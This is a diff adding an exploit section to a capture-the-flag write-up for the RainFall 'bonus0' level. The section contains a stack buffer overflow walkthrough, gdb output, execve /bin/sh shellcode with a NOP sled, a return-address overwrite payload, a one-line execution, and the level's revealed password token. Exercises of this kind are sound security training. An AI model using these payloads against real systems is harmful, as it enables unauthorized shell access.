@@ -130,3 +130,84 @@ Segmentation fault (core dumped)
 - searches for the newline character ('\n') in the buffer using strchr.
 - Upon finding the newline character, it replaces it with the null terminator ('\0'), effectively terminating the string.
 - Next, it copies the first 0x14 bytes from the buffer to a location specified by the second argument.
+
+
+The `p` function appears to be vulnerable to a buffer overflow vulnerability. It reads up to `0x1000` (4096) bytes from standard input into a buffer on the stack without checking the size of the input. This can lead to a buffer overflow if the input is larger than the buffer size.
+
+It replaces the `\n` with `\0`, then copies 20 bytes from the buffer
+If we enter more characters the string will bot be null terminated.
+
+```
+bonus0@RainFall:~$ ./bonus0
+ -
+1
+ -
+01234567890123456789
+1 01234567890123456789���
+```
+
+The program crashes or exhibits unexpected behavior when provided with an input string longer than 20 characters. This behavior confirms the presence of a buffer overflow vulnerability.
+
+## Exploit
+```
+(gdb) run
+Starting program: /home/user/bonus0/bonus0
+ -
+01234567890123456789
+ -
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41336141 in ?? ()
+```
+
+The ASCII representation for the hexadecimal value `0x41336141` is `A3aA`.
+
+In our pattern we have 9 characters before `A3aA`.
+
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
+
+Shellcode used: [Linux/x86 - execve /bin/sh shellcode - 23 bytes](https://shell-storm.org/shellcode/files/shellcode-827.html)
+
+**First payload:**
+```
+python -c 'print "\x90" * 40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
+```
+- `\x90` (NOP) instructions for padding, to ensure the shellcode is properly aligned.
+- Shellcode that spawns a shell (/bin/sh) using the execve syscall. This shellcode is written in assembly and performs the following actions:
+    - Zeroes out the `%eax` register (`\x31\xc0`).
+    - Pushes null bytes onto the stack (`\x50`).
+    - Pushes the string `"/bin/sh"` onto the stack (`\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e`).
+    - Copies the pointer to the string `"/bin/sh"` into `%ebx`, `%ecx`, and `%edx` registers (`\x89\xe3\x89\xc1\x89\xc2`).
+    - Sets %eax to 0x0b, indicating the execve syscall (`\xb0\x0b`).
+    - Invokes the syscall (`\xcd\x80`).
+
+**Second payload:**
+```
+python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "A" * 7'
+```
+- 9 bytes of padding (A characters).
+- The little-endian representation of the address (\xd0\xe6\xff\xbf) to overwrite the return address.
+- 7 bytes of padding (A characters) to reach the 20 bytes
+
+**Execution:**
+```
+bonus0@RainFall:~$ (python -c 'print "\x90" * 40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "A" * 7'; cat) | ./bonus0
+ -
+ -
+��������������������AAAAAAAAA����BBBBBBB��� AAAAAAAAA����AAAAAAA���
+
+whoami
+bonus1
+pwd
+/home/user/bonus0
+cd ../bonus1
+ls -a
+.  ..  .bash_logout  .bashrc  .pass  .profile  bonus1
+cat .pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
